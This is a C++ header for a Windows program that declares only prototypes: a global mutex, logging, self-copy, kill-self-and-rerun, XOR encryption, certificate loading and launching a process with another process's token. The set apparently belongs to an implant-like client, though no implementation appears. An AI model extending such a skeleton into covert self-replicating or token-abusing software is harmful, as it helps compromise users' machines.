#pragma once

#include <windows.h>

#include <string.h>

#include <string>

#include <stdio.h>

	
#define MY_MUTEX_NAME				"Global\\MY_MUTEX_CLIENT_NAME"

#define OPERATION_LOG_FILENAME		"operation.log"

#define RUNNING_LOG_FILENAME		"running.log"


using namespace std;

int restart(const char* newpath, const char* oldpath);

int __stdcall delFileProc(wchar_t* filename);

int __cdecl runLog(const WCHAR* format, ...);

int __cdecl runLog(const CHAR* format, ...);



unsigned short crc16(unsigned char* data, int size);


int isTerminated();

int getOsBits();

int cpuBits();

int wow64();


HANDLE  bRunning(BOOL* exist);

int xor_crypt(char* data, int len);

int copySelf(const char* dest,const char * src);

LPVOID getCertFile(int * size);

DWORD getProcNameByPID(DWORD pid, char* procname, int buflen);

DWORD getPidByName(const char* szProcessName);

int createProcessWithToken(LPSTR lpTokenProcessName, LPSTR szProcessName, LPSTR szparam);

int getModules();

void KillSelfAndRun(const char* szFilename,const char* szCmd);